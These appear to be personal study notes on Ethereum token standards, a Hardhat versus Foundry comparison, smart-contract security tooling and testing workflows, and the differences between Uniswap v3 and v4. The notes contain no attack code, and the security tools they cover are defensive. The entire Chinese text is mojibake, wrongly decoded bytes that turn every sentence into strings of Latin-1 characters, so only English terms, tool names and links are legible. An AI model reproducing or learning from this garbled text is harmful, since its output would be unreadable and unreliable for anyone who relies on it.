- EIP-712 è®©ç”¨æˆ·åœ¨é’±åŒ…ï¼ˆå¦‚ MetaMaskï¼‰çœ‹åˆ°æ¸…æ™°çš„å¾…ç­¾åæ•°æ®ç»“æ„ â†’ **å¯è¯»æ€§ & å®‰å…¨æ€§**ã€‚
    

### æŠ€æœ¯æ ˆ / æ›´æ–°

- **TypedData hashing + Solidity keccak256**ã€‚
    
- é’±åŒ…æ”¯æŒï¼šMetaMaskã€Gnosis Safeã€‚
    
- æŠ€æœ¯æ›´æ–°ï¼šDeFi å¹¿æ³›ä½¿ç”¨ï¼ˆ0x åè®®ã€Permitã€LayerZeroã€è·¨é“¾æ¶ˆæ¯ï¼‰ã€‚
    
- åœ¨ DeFi ä¸­ç»“åˆ **EIP-2612**ï¼Œå‡ ä¹æˆä¸ºæ ‡é…ã€‚
    



# âœ… å·®åˆ«

|æ ‡å‡†|ç®€ä»‹|è§£å†³çš„é—®é¢˜|æŠ€æœ¯æ ˆ / æ›´æ–°|
|---|---|---|---|
|ERC-20|åŒè´¨åŒ–ä»£å¸æ ‡å‡†|ä»£å¸æ¥å£ç»Ÿä¸€ï¼Œé’±åŒ…/DEX é€šç”¨|Solidity + OpenZeppelinï¼›æ‰©å±•ï¼šERC777ã€EIP-2612|
|ERC-721|NFT æ ‡å‡†|è¡¨è¾¾å”¯ä¸€èµ„äº§|Solidity + OpenZeppelinï¼›æ‰©å±•ï¼šERC721Aã€ERC4907|
|ERC-1155|å¤šèµ„äº§æ ‡å‡†|æ‰¹é‡ç®¡ç†ã€å¤šèµ„äº§å…±å­˜|Solidity + OpenZeppelinï¼›æ‰¹é‡è½¬è´¦çœ Gas|
|ERC-4626|Vault æ ‡å‡†|ç»Ÿä¸€æ”¶ç›Šé‡‘åº“æ¥å£|Solidity + OpenZeppelin ERC4626ï¼›æé«˜å¯ç»„åˆæ€§|
|EIP-2612|ERC20 Permit|å‡å°‘ approve æ­¥éª¤|Solidity + EIP-712ï¼›OpenZeppelin ERC20Permitï¼›Permit2|
|EIP-712|Typed Data ç­¾å|æå‡ç­¾åå®‰å…¨æ€§|Solidity hashingï¼›é’±åŒ…æ”¯æŒå¹¿æ³›|

# 2025-08-17

# ä¸€ã€Hardhatå’ŒFoundry

- **Hardhat**ï¼šä»¥ Node.js ç”Ÿæ€ä¸ºæ ¸å¿ƒçš„â€œè„šæ‰‹æ¶ + æœ¬åœ°åŒºå—é“¾ + æµ·é‡æ’ä»¶â€å¹³å°ï¼Œæœ€å¼ºåœ¨**æ’ä»¶ç”Ÿæ€ã€éƒ¨ç½²ç¼–æ’ã€ä¸å‰ç«¯/TS å·¥ç¨‹ä½“ç³»çš„æ•´åˆ**ã€‚
    
- **Foundry**ï¼šRust å®ç°çš„**é«˜æ€§èƒ½ Solidity åŸç”Ÿå¼€å‘å¥—ä»¶**ï¼ˆforge/cast/anvilï¼‰ã€‚æœ€å¼ºåœ¨**ç¼–è¯‘/æµ‹è¯•é€Ÿåº¦ã€å†…ç½®æ¨¡ç³Š/ä¸å˜å¼æµ‹è¯•ã€ä½æ‘©æ“¦é“¾ä¸Šè„šæœ¬åŒ–**ã€‚
    

# äºŒã€ç‰¹æ€§å¯¹æ¯”ï¼ˆå·¥ç¨‹è§†è§’ï¼‰

|ç»´åº¦|Hardhat|Foundry|
|---|---|---|
|ä¸»è¦è¯­è¨€/è„šæœ¬|TypeScript/JavaScriptï¼ˆæµ‹è¯•ã€ä»»åŠ¡ã€éƒ¨ç½²è„šæœ¬ï¼‰|Solidityï¼ˆæµ‹è¯•ã€è„šæœ¬ï¼‰+ `cast` CLI|
|æœ¬åœ°é“¾|Hardhat Networkï¼ˆä¸»ç½‘åˆ†å‰ç¨³å®šã€æ’ä»¶å¤šï¼‰|Anvilï¼ˆå¯åŠ¨å¿«ã€èµ„æºå ç”¨ä½ã€åˆ†å‰å¿«ï¼‰|
|ç¼–è¯‘ä¸é€Ÿåº¦|åŸºäº `solc`ï¼Œé€Ÿåº¦ä¸­ç­‰ï¼Œä¾èµ– Node ç”Ÿæ€|å¹¶è¡Œç¼–è¯‘ï¼Œæ™®éæ›´å¿«ï¼›ç¼“å­˜æœºåˆ¶ä¼˜ç§€|
|æµ‹è¯•å½¢æ€|Mocha/Chai + ethers.js/viemï¼ˆä»â€œç”¨æˆ·è§†è§’â€å†™æµ‹è¯•ï¼‰|Solidity åŸç”Ÿå•æµ‹ï¼ŒCheatcodes ä¸°å¯Œï¼Œå¤©ç„¶â€œåˆçº¦å†…è§†è§’â€|
|Fuzz/Invariant|ä¾èµ–å¤–éƒ¨å·¥å…·ï¼ˆEchidna ç­‰ï¼‰æˆ–æ’ä»¶é›†æˆ|**å†…ç½®** fuzz/invariant ä¸ shrinkï¼Œæ˜“ä¸Šæ‰‹|
|Gas å·¥å…·|`hardhat-gas-reporter` ç­‰æ’ä»¶|`forge test --gas-report`ã€`forge snapshot`|
|è¦†ç›–ç‡|`solidity-coverage` æ’ä»¶æˆç†Ÿ|`forge coverage`ï¼ˆç°å·²å¯ç”¨ï¼Œé›†æˆåº¦é«˜ï¼‰|
|è°ƒè¯•ä½“éªŒ|`hardhat/console.sol`ã€è¯¦ç»† error å †æ ˆã€ä»»åŠ¡ç³»ç»Ÿ|`-vvvv` çº§åˆ«è°ƒç”¨è¿½è¸ªã€`console2`ã€Cheatcodesï¼ˆ`prank/deal/warp` ç­‰ï¼‰|
|ä¾èµ–ç®¡ç†|npm/pnpm/yarn|`forge install`ï¼ˆgit æºï¼‰+ remappings|
|æ’ä»¶ç”Ÿæ€|**æå…¶ä¸°å¯Œ**ï¼ˆéƒ¨ç½²ã€éªŒè¯ã€å‡çº§ã€Defenderâ€¦ï¼‰|ç›¸å¯¹è½»ï¼›æ›´å¤šâ€œå†…å»ºâ€è€Œéâ€œæ’ä»¶åŒ–â€|
|ä¸å‰ç«¯é›†æˆ|**ä¸€æµ**ï¼ˆTS ç±»å‹æç¤ºã€viem/wagmiã€ä»»åŠ¡å¼éƒ¨ç½²äº§ç‰©ï¼‰|å¯è¡Œä½†æ›´â€œå·¥å…·ç®±åŒ–â€ï¼Œå¸¸ä¸ Hardhat/å‰ç«¯ä»“åˆ†ç¦»|
|CI/DevOps|åŸºäº Node å·¥å…·é“¾ï¼Œæ¨¡æ¿ä¼—å¤š|äºŒè¿›åˆ¶å·¥å…·ï¼ŒCI é€Ÿåº¦å¿«ã€é•œåƒå°|

> é€‰æ‹©ï¼š
> 
> - **ä»¥ DApp/å‰ç«¯é©±åŠ¨ã€ä¾èµ–æ’ä»¶å’Œéƒ¨ç½²ç¼–æ’** â†’ é€‰ **Hardhat** æˆ– **Hardhat+Foundry** æ··åˆã€‚
>     
> - **ä»¥ç ”ç©¶/å®‰å…¨/æ€§èƒ½ä¸æµ‹è¯•ä¸ºä¸­å¿ƒ** â†’ é€‰ **Foundry** ä¸»å¯¼ã€‚
>     

# ä¸‰ã€é€‰æ‹©

å¸¸è§é«˜æ•ˆç»„åˆï¼š

- **Foundry è´Ÿè´£ï¼š** ç¼–è¯‘ã€å•æµ‹ã€fuzzã€ä¸å˜å¼ã€gas å›å½’ï¼›
    
- **Hardhat è´Ÿè´£ï¼š** å¤šç½‘ç»œéƒ¨ç½²ã€Etherscan/åŒºå—æµè§ˆå™¨éªŒè¯ã€ä¸å‰ç«¯/è„šæœ¬ä»»åŠ¡ç¼–æ’ã€OpenZeppelin Upgrades ç­‰æ’ä»¶é“¾è·¯ã€‚  
    åšæ³•ï¼šåŒä¸€ä»“æˆ– mono-repo ä¸­ï¼Œä¿ç•™ `foundry.toml` ä¸ `hardhat.config.ts`ï¼Œåˆçº¦æºç å…±äº«ï¼ŒCI ä¸­åˆ†åˆ«è·‘ `forge test` ä¸ `hardhat deploy/verify`ã€‚
    

# å››ã€å®‰å…¨æŠ€æœ¯æ ˆ

## 1) Hardhat å®‰å…¨æ ˆ

**å†…æ ¸ç†å¿µï¼š** â€œæ’ä»¶é©±åŠ¨ + å¤–éƒ¨å®‰å…¨å·¥å…·çš„æ— ç¼é›†æˆ + ä¸»ç½‘åˆ†å‰å›å½’â€ã€‚

- **åŸºçº¿åº“**
    
    - **OpenZeppelin Contracts**ï¼ˆå®‰å…¨åŸºå…ƒã€æƒé™/ä»£å¸/ä»£ç†æ¨¡å¼ï¼‰
        
    - OpenZeppelin **Upgrades** æ’ä»¶ï¼ˆTransparent/UUPS ä»£ç†ã€**å­˜å‚¨å¸ƒå±€æ£€æŸ¥**ï¼‰
        
- **é™æ€åˆ†æ**
    
    - **Slither**ï¼ˆPythonï¼Œé™æ€åˆ†æã€æ¼æ´æ£€æµ‹ã€ç»“æ„æŠ¥å‘Šã€è„šæœ¬åŒ–å®¡è®¡ï¼‰
        
    - Solhintï¼ˆé£æ ¼/æ˜“é”™ç‚¹ Lintï¼‰
        
- **å±æ€§/è§„çº¦ä¸å½¢å¼åŒ–**
    
    - **Scribble**ï¼ˆè§„èŒƒæ³¨é‡Š â†’ ä»ªè¡¨åŒ–æ–­è¨€ï¼Œå¯ä¸ Hardhat æµç¨‹é›†æˆï¼‰
        
    - **Certora Prover**ï¼ˆè§„åˆ™çº§å½¢å¼åŒ–éªŒè¯ï¼›å¯¹å…³é”®åˆçº¦å¾ˆæœ‰ä»·å€¼ï¼‰
        
- **æ¨¡ç³Š/ç¬¦å·æ‰§è¡Œ**
    
    - **Echidna**ï¼ˆåŸºäºæ€§è´¨çš„æ¨¡ç³Šæµ‹è¯•ï¼‰
        
    - Mythril / Manticoreï¼ˆç¬¦å·æ‰§è¡Œï¼›æ›´åâ€œå®¡è®¡/ç ”ç©¶â€ï¼‰
        
- **è¦†ç›–ç‡ä¸ gas**
    
    - `solidity-coverage`ã€`hardhat-gas-reporter`
        
- **è¿è¡Œæ—¶ä¸å›å½’**
    
    - Hardhat Network **ä¸»ç½‘åˆ†å‰**ï¼ˆå¯¹ DeFi/è·¨åè®®äº¤äº’å°¤ä¸ºé‡è¦ï¼‰
        
    - Defenderï¼ˆSentinel/AutoTasks/Timelock/å¤šç­¾å·¥ä½œæµï¼‰
        
- **æœ€ä½³å®è·µ**
    
    - å‡çº§åˆçº¦ï¼šå¼ºåˆ¶å­˜å‚¨å¸ƒå±€ Diffã€å†»ç»“ä¸å¯å˜å˜é‡ã€ç‹¬ç«‹ `initialize` è®¿é—®æ§åˆ¶
        
    - å¤šç­¾ã€å»¶æ—¶ï¼ˆTimelockï¼‰ä¸è§’è‰²æœ€å°åŒ–ï¼›äº‹ä»¶å®¡è®¡ä¸**å˜æ›´å…¬å‘Š**æµç¨‹
        

## 2) Foundry å®‰å…¨æ ˆ

**å†…æ ¸ç†å¿µï¼š** â€œæŠŠå®‰å…¨æµ‹è¯•åšæˆé»˜è®¤è·¯å¾„ï¼šå¿«ã€åŸç”Ÿã€å¯ç¼–æ’â€ã€‚

- **å†…ç½®èƒ½åŠ›ï¼ˆæ— éœ€é¢å¤–å·¥å…·å³ä¸Šå¼ºåº¦ï¼‰**
    
    - **Fuzz/Invariant**ï¼š`forge test` ç›´æ¥å¼€å¯ï¼›`targetSelectors`/`targetContracts` é…ç½®ï¼›Shrinking é»˜è®¤æ”¯æŒ
        
    - **Cheatcodes**ï¼š`prank/warp/roll/deal/record/revertTo` ç­‰æ¨¡æ‹Ÿæƒé™ã€æ—¶é—´ã€éšæœºæ€§ä¸é“¾ä¸ŠçŠ¶æ€
        
    - **Gas/Trace**ï¼š`--gas-report`ã€`-vvvv` æ·±åº¦è°ƒç”¨è½¨è¿¹
        
    - **Coverage**ï¼š`forge coverage`
        
    - **Scripts**ï¼š`forge script --broadcast` å®‰å…¨å¤ç°éƒ¨ç½²æ­¥éª¤ã€æ”¯æŒ Dry-run ä¸æ¨¡æ‹Ÿ
        
- **å¯å åŠ çš„å¤–éƒ¨å·¥å…·**
    
    - åŒæ ·å¯æ— ç¼æ¥å…¥ **Slitherã€Echidnaã€Scribbleã€Certora**ï¼ˆå¾ˆå¤šå®¡è®¡å›¢é˜Ÿå°±æ˜¯ Foundry+Slither/Echidna çš„ç»„åˆï¼‰
        
- **æµ‹è¯•èŒƒå¼**
    
    - **ä¸å˜å¼æµ‹è¯•**ï¼ˆInvariantsï¼‰â†’ å¯¹ DeFi ç­‰çŠ¶æ€æœºå¼ºçº¦æŸéå¸¸æœ‰æ•ˆï¼ˆå¦‚â€œç³»ç»Ÿæ€»ä½™é¢å®ˆæ’â€ã€â€œæ°¸ä¸å‡ºç°è´Ÿå€ºçˆ†è¡¨â€ï¼‰
        
    - **å·®åˆ†æµ‹è¯•**ï¼ˆä¸å‚è€ƒå®ç°æˆ–æ—§ç‰ˆæœ¬å¯¹æ¯”ï¼‰
        
    - **ä¸»ç½‘åˆ†å‰**ï¼š`anvil --fork-url` + `forge test` åœ¨çœŸå®åè®®ä¸Šä¸‹æ–‡ä¸­ fuzz
        
- **æœ€ä½³å®è·µ**
    
    - ä¸ºå…³é”®ä¸å˜é‡å†™â€œ**æœ€å°å¯å¤ç°æ”»å‡»é¢**â€æµ‹è¯•ï¼ˆå•æ¬¡äº¤æ˜“ + å¤š tx åºåˆ—ï¼‰
        
    - ä¸ºæƒé™é€»è¾‘å†™â€œåå‘â€ç”¨ä¾‹ï¼ˆæ¶æ„è°ƒç”¨è€…ã€é”™è¯¯è§’è‰²ã€EOA/åˆçº¦æ··åˆï¼‰
        

# äº”ã€ç«¯åˆ°ç«¯çš„å®‰å…¨æµç¨‹

1. **ç¼–ç å‰**ï¼šé€‰ç”¨ **OZ Contracts** åŸºå…ƒï¼›å®šç¨¿**ä¿¡ä»»æ¨¡å‹**ä¸**å‡çº§ç­–ç•¥**ï¼ˆæ˜¯å¦å¯å‡çº§ï¼Ÿç”±è°å‡çº§ï¼Ÿæ˜¯å¦ Timelock/å¤šç­¾ï¼Ÿï¼‰ã€‚
    
2. **é™æ€æ£€æŸ¥**ï¼šSolhint + **Slither** åŸºçº¿æ‰«æï¼›å®šåˆ¶ Slither è„šæœ¬åšç»“æ„æ€§æ£€æŸ¥ï¼ˆå¦‚æˆæƒç‚¹ã€å¤–éƒ¨å¯é‡å…¥ç‚¹ï¼‰ã€‚
    
3. **å•å…ƒ/é›†æˆæµ‹è¯•**ï¼š
    
    - Hardhatï¼šMocha/Chai + viem/ethers å†™â€œç”¨æˆ·è§†è§’â€æµç¨‹ï¼›
        
    - Foundryï¼šSolidity å•æµ‹è¦†ç›–â€œåˆçº¦å†…ç»†èŠ‚ä¸è¾¹ç•Œâ€ã€‚
        
4. **Fuzz / Invariant**ï¼š
    
    - Hardhatï¼šå¼•å…¥ **Echidna** æˆ–æŠŠåˆçº¦ä»ªè¡¨åŒ–ï¼ˆScribbleï¼‰åè·‘ï¼›
        
    - Foundryï¼šç›´æ¥ç”¨å†…ç½® fuzz/invariantï¼ˆæ¨èï¼ŒæŠŠæ€§è´¨å†™æ¸…æ¥šï¼‰ã€‚
        
5. **ä¸»ç½‘åˆ†å‰å›å½’**ï¼šæ¨¡æ‹ŸçœŸå®åè®®å¤–éƒ¨äº¤äº’ï¼ˆé¢„è¨€æœºã€Dexã€å€Ÿè´·ï¼‰ï¼ŒéªŒè¯ç»æµå®‰å…¨ä¸æ²™ç›’å‚æ•°ã€‚
    
6. **å½¢å¼åŒ–å…³é”®è·¯å¾„**ï¼šå¯¹èµ„é‡‘å…³é”®æ¨¡å—ç”¨ **Scribble** æ–­è¨€æˆ– **Certora** è§„åˆ™åšâ€œè¯æ˜çº§â€ä¿éšœã€‚
    
7. **è¦†ç›–ç‡ & Gas å›å½’**ï¼šå°†è¦†ç›–ç‡å’Œ gas é¢„ç®—çº³å…¥ CI é˜ˆå€¼ï¼ˆPR é™çº§å³é˜»æ–­ï¼‰ã€‚
    
8. **éƒ¨ç½²/è¿ç»´å®‰å…¨**ï¼š
    
    - å¯å‡çº§åˆçº¦å¼ºåˆ¶å­˜å‚¨å¸ƒå±€å¯¹æ¯”ï¼›
        
    - å¤šç­¾/Timelockï¼›
        
    - **Etherscan/Blockscout éªŒè¯** + ç”Ÿæˆ SBOMï¼ˆä¾èµ–æ¸…å•ï¼‰ï¼›
        
    - çº¿ä¸Š **ç›‘æ§ä¸å‘Šè­¦**ï¼ˆDefender Sentinelã€äº‹ä»¶è®¢é˜…ï¼‰ã€‚
        
9. **åº”æ€¥é¢„æ¡ˆ**ï¼šæš‚åœå¼€å…³ï¼ˆå¯æ§å¯è§ï¼‰ã€é€Ÿæ’¤æµåŠ¨æ€§/å‚æ•°é™åˆ¶è„šæœ¬ã€å…¬å‘Šæ¨¡æ¿ä¸å›æ»šè®¡åˆ’ã€‚
    

# å…­ã€å¦‚ä½•é€‰æ‹©ï¼ˆç½‘ä¸Šå»ºè®®ï¼‰

- **ååº”ç”¨/å‰ç«¯åä½œ/æ’ä»¶é“¾è·¯**é‡ï¼š**Hardhat**ï¼ˆæˆ– Hardhat åšéƒ¨ç½²ï¼ŒFoundry åšæµ‹è¯•ï¼‰ã€‚
    
- **åå®‰å…¨/ç ”ç©¶/é«˜è¦†ç›–æµ‹è¯•**é‡ï¼š**Foundry** ä¸»å¯¼ï¼Œå¿…è¦æ—¶åŠ ä¸Š Hardhat çš„éƒ¨ç½²æ’ä»¶é“¾è·¯ã€‚
    
- **å›¢é˜Ÿ TS å¾ˆå¼º**ã€ä¸å‰ç«¯å¤ç”¨ç±»å‹/å·¥å…·ï¼š**Hardhat**
    
- **å›¢é˜Ÿä»¥å®¡è®¡/åè®®ä¸ºä¸­å¿ƒ**ã€å¼ºè°ƒ fuzz/invariant ä¸é«˜é¢‘å›å½’ï¼š**Foundry**

# 2025-08-15

# Uniswap

- **v3ï¼ˆ2021ï¼‰**ï¼šæå‡ºâ€œ**é›†ä¸­æµåŠ¨æ€§**â€ï¼ˆLP å¯æŠŠèµ„é‡‘åªæŠ•åœ¨è‡ªé€‰ä»·åŒºï¼‰ï¼Œå¹¶é…åˆå¤šè´¹ç‡æ¡£ã€NFT å¤´å¯¸ä¸å†…ç½® TWAP é¢„è¨€æœºï¼Œæ˜¾è‘—æå‡èµ„é‡‘æ•ˆç‡ä¸å¯ç»„åˆæ€§ã€‚([Uniswapæ–‡æ¡£](https://docs.uniswap.org/concepts/protocol/concentrated-liquidity?utm_source=chatgpt.com "Concentrated Liquidity"), [app.uniswap.org](https://app.uniswap.org/whitepaper-v3.pdf?utm_source=chatgpt.com "Uniswap v3 Core"))
    
- **v4ï¼ˆ2025ï¼‰**ï¼šåœ¨å»¶ç»­ v3 èµ„é‡‘æ•ˆç‡çš„åŸºç¡€ä¸Šï¼Œæ¢æˆ **Singleton** æ¶æ„ + **Flash Accounting**ï¼ˆå‡€é¢ç»“ç®—ï¼‰+ **Hooks** å¯ç¼–ç¨‹æ‰©å±•ï¼›è´¹ç”¨ä»å›ºå®šæ¡£å˜ä¸º **0â€“100% å¯é…ç½®/å¯åŠ¨æ€**ï¼›æ”¯æŒ **åŸç”Ÿ ETH**ï¼ˆæ— éœ€å…ˆåŒ…æˆ WETHï¼‰ã€‚
    


|       | v3                       | v4                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ----- | ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| åˆçº¦æ¶æ„  | Factory + æ¯ä¸ªæ± éƒ½æ˜¯ç‹¬ç«‹åˆçº¦      | **å•åˆçº¦ PoolManagerï¼ˆSingletonï¼‰** ç®¡å…¨éƒ¨æ± çŠ¶æ€ï¼Œåˆ›å»º/å¤šè·³æ›´çœ Gasã€‚                                                                                                                                                                                                                                                                                                                                                                    |
| èµ„é‡‘æ•ˆç‡  | **é›†ä¸­æµåŠ¨æ€§**ï¼ˆLP æŒ‡å®šä»·åŒºï¼‰       | ç»§æ‰¿ v3 çš„é›†ä¸­æµåŠ¨æ€§æœºåˆ¶ã€‚                                                                                                                                                                                                                                                                                                                                                                                                       |
| è´¹ç”¨æœºåˆ¶  | å›ºå®šæ¡£ï¼ˆ0.01%ã€0.05%ã€0.3%ã€1%ï¼‰ | **å¯é…ç½®è´¹ç‡ï¼ˆ0â€“100%ï¼‰**ï¼Œå¯é™æ€æˆ–ç”± **Hook åŠ¨æ€**å†³å®šã€‚([Uniswapæ–‡æ¡£](https://docs.uniswap.org/concepts/protocol/fees?utm_source=chatgpt.com "Fees"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))                                                                                                                                                       |
| ç»“ç®—ä¸è½¬è´¦ | æ¯è·³éƒ½çœŸå®è½¬è´¦ï¼Œè·¨å¤šæ± æˆæœ¬é«˜           | **Flash Accounting**ï¼Œäº¤æ˜“æœ«å°¾æŒ‰å‡€é¢ç»“ç®—ï¼Œè·¨æ± æ›´çœ Gasï¼›é™„å¸¦â€œ**å…è´¹é—ªç”µè´·**â€æ€§è´¨ã€‚([Uniswapæ–‡æ¡£](https://docs.uniswap.org/contracts/v4/concepts/flash-accounting?utm_source=chatgpt.com "Flash Accounting"), [Uniswap Labs](https://blog.uniswap.org/uniswap-v4?utm_source=chatgpt.com "Our Vision for Uniswap v4"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit")) |
| åŸç”Ÿèµ„äº§  | éœ€ WETH/WMATIC åŒ…è£…         | **åŸç”Ÿ ETH ç›´ç”¨**ï¼Œç”¨æˆ·ä½“éªŒæ›´å¥½ã€‚                                                                                                                                                                                                                                                                                                                                                                                                 |
| å¯ç¼–ç¨‹æ€§  | åè®®å†…ç½®åŠŸèƒ½ä¸ºä¸»                 | **Hooks**ï¼šåœ¨å»ºæ± /åŠ å‡ä»“/æ¢æ±‡ç­‰ç”Ÿå‘½å‘¨æœŸâ€œå‰/åâ€æ’å…¥è‡ªå®šä¹‰é€»è¾‘ï¼ˆé™ä»·å•ã€å®šåˆ¶é¢„è¨€æœºã€è´¹ç”¨ç®¡ç†ã€åšå¸‚ç­–ç•¥ç­‰ï¼‰ã€‚                                                                                                                                                                                                                                                                                                                                                          |
| å¤´å¯¸è¡¨ç¤º  | æ¯ä¸ª LP å¤´å¯¸æ˜¯ **ERC-721**    | ä»ç”± **v4 PositionManager é“¸é€ /ç®¡ç† ERC-721 å¤´å¯¸**ï¼›ä½†ç»“ç®—å±‚å¼•å…¥ **ERC-6909** åšå†…éƒ¨è®°è´¦ä¸èµå›ä¼˜åŒ–ã€‚                                                                                                                                                                                                                                                                                                                                            |
| é¢„è¨€æœº   | **å†…ç½® TWAP é¢„è¨€æœº**ï¼ˆæ± å¯ç›´æ¥å‡ºä»·ï¼‰  | **ä¸å†å†…ç½®é¢„è¨€æœº**ï¼›å¦‚éœ€å¯ç”± Hook å®šåˆ¶ã€‚                                                                                                                                                                                                                                                                                                                                                                                             |
| èŒƒå¼/è·¯ç”± | v3 Router + SDK          | **Universal Router + v4 SDK**ï¼Œæ”¯æŒ v4 çš„æ–°ç»“ç®—/Hook è¯­ä¹‰ã€‚(                                                                                                                                                                                                                                                                                                                                                                    |

> å¤‡æ³¨ï¼š**Range Ordersï¼ˆåŒºé—´å•ï¼‰** åœ¨ v3/v4 è¯­ä¹‰ä¸€è‡´ï¼Œéƒ½æ˜¯ç”¨â€œå•è¾¹é›†ä¸­æµåŠ¨æ€§ + ä»·åŒºç©¿è¶Šâ€æ¥è¿‘ä¼¼é™ä»·å•ã€‚

# v4 çš„å…³é”®æŠ€æœ¯ç‚¹ï¼ˆä¸ºä»€ä¹ˆæ›´â€œçµæ´»+ä½ Gasâ€ï¼‰

1. **Singleton + Flash Accounting**  
    å…¨æ± çŠ¶æ€é›†ä¸­åˆ° `PoolManager`ï¼›ä¸€æ¬¡äº¤æ˜“å†…å…ˆç”¨**ç¬æ—¶çŠ¶æ€**è®°è´¦ï¼ˆå— EIP-1153/Transient Storage è®¾è®¡å¯å‘ï¼‰ï¼Œæœ€åç»Ÿä¸€ç»“ç®—ï¼Œè·¨å¤šæ± /å¤šæ­¥æ“ä½œæ˜¾è‘—çœ Gasï¼Œå¹¶å¤©ç„¶å½¢æˆâ€œ**å‡€é¢ç»“ç®—/å…è´¹é—ªç”µè´·**â€ç‰¹æ€§ã€‚([GitHub](https://github.com/Uniswap/v4-core?utm_source=chatgpt.com "Core smart contracts of Uniswap v4"), [Uniswapæ–‡æ¡£](https://docs.uniswap.org/contracts/v4/concepts/flash-accounting?utm_source=chatgpt.com "Flash Accounting"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))    
2. **Hooksï¼ˆæ± çº§å¯ç¼–ç¨‹ï¼‰**  
    åœ¨å»ºæ± ã€swapã€modifyLiquidityã€donate ç­‰å‰/åæ’ç‚¹æ‰§è¡Œå¤–éƒ¨åˆçº¦ï¼Œå®ç°**åŠ¨æ€è´¹ç‡ã€åšå¸‚ç­–ç•¥ã€é¢„è¨€æœºã€é£æ§/åˆè§„æ¨¡å—**ç­‰ï¼›æ˜¯ v4 çš„å¯æ‰©å±•æ ¸å¿ƒã€‚
3. **è´¹ç”¨ä¸ä¼šè®¡å®Œå…¨å¯å®šåˆ¶**  
    è´¹ç‡èŒƒå›´ 0â€“100%ï¼Œé™æ€æˆ–ç”± Hook æ¯ç¬”åŠ¨æ€è®¾å®šï¼›é…åˆ **Custom Accounting/Return Deltas** å¯å®ç°å¤æ‚ç»æµæ¨¡å‹ã€‚([blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"), [Uniswapæ–‡æ¡£](https://docs.uniswap.org/contracts/v4/guides/custom-accounting?utm_source=chatgpt.com "Custom Accounting | Uniswap"))    
4. **åŸç”Ÿ ETH æ”¯æŒ**  
    è·¯ç”±/PoolKey ç›´æ¥æ ‡è¯† ETHï¼Œå‡å°‘ wrap/unwrap æˆæœ¬ä¸è¾¹ç•Œå¤æ‚åº¦ã€‚
5. **ERC-6909 å†…éƒ¨è®°è´¦**  
    ä¸ Flash Accounting ååŒï¼Œå…è®¸åœ¨ `PoolManager` å†…ä»¥å¤š token-id å½¢å¼è®°è´¦ã€èµå›/å½’è¿˜ï¼Œè¿›ä¸€æ­¥å‹ä½èµå›/é¢†å– Gasã€‚
    

# 2024â€“2025

- **ä¸»ç½‘ä¸Šçº¿ & å¤šé“¾éƒ¨ç½²**ï¼š**2025-01-31** v4 æ­£å¼å‘å¸ƒï¼Œ**ä»¥å¤ªåŠã€Polygonã€Arbitrumã€OP Mainnetã€Baseã€BNBã€Blastã€World Chainã€Avalancheã€Zora** ç­‰é“¾å¯ç”¨ã€‚([Uniswap Labs](https://blog.uniswap.org/uniswap-v4-is-here?utm_source=chatgpt.com "Uniswap v4 is Here â€“ A New Era of DeFi"))    
- **å®‰å…¨ä¸å®¡è®¡**ï¼šä¸Šçº¿å‰ç»„ç»‡äº†**å¤šè½®å®¡è®¡/ç«èµ›**ä¸ **$15.5M** èµé‡‘ï¼›ç‹¬ç«‹å®¡è®¡æŠ¥å‘Šä¹Ÿå‰–æäº† **Flash Accountingâ€œå…è´¹é—ªç”µè´·â€** ä¸ **ERC-6909 ç»“ç®—** çš„å®‰å…¨æ³¨æ„ç‚¹ã€‚([Uniswap Labs](https://blog.uniswap.org/v4-bug-bounty?utm_source=chatgpt.com "$15.5M Bug Bounty for Uniswap v4: The Largest in History"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))
- **æ•°æ®ä¸åˆ†æè¿ç§»**ï¼šå›  **Singleton** ä¸æ–°è®°è´¦èŒƒå¼ï¼Œv4 çš„é“¾ä¸Šæ•°æ®æŠ“å–/æŸ¥è¯¢æ–¹å¼ä¸ v3 æœ‰æ˜æ˜¾ä¸åŒï¼ˆç ”ç©¶è€…/åˆ†æå¸ˆéœ€æ›´æ–°æ–¹æ³•ï¼‰ã€‚([uniswapfoundation.mirror.xyz](https://uniswapfoundation.mirror.xyz/c7LDDTWhC2ry6gp0nGqcSKHvNHosJmhPQ-ZuIxqeB2I?utm_source=chatgpt.com "How to Navigate Uniswap v4 Data"))    
- **å¼€å‘ç”Ÿæ€**ï¼šå‘å¸ƒ **v4 SDK** ä¸ **Universal Router** æ–‡æ¡£/ç¤ºä¾‹ï¼ŒåŒæ—¶å®˜æ–¹/ç¤¾åŒºç»™å‡º Hook æ¨¡æ¿ä¸å®è·µæŒ‡å¼•ï¼ˆå¦‚ BaseHookã€é£æ§/ç§¯åˆ†/åŠ¨æ€è´¹ç‡ Hook ç­‰ï¼‰ã€‚([Uniswapæ–‡æ¡£](https://docs.uniswap.org/sdk/v4/overview?utm_source=chatgpt.com "The Uniswap v4 SDK"))    
- **è®¸å¯ä¸åˆè§„**ï¼š    
    - v3ï¼šæœ€åˆ BUSLï¼Œåå·²è½¬ **GPL**ï¼ˆå¯è‡ªç”±å¤åˆ»ï¼Œéµå®ˆ GPL å³å¯ï¼‰ã€‚([support.uniswap.org](https://support.uniswap.org/hc/en-us/articles/14569783029645-Uniswap-v3-licensing?utm_source=chatgpt.com "Uniswap v3 licensing"))        
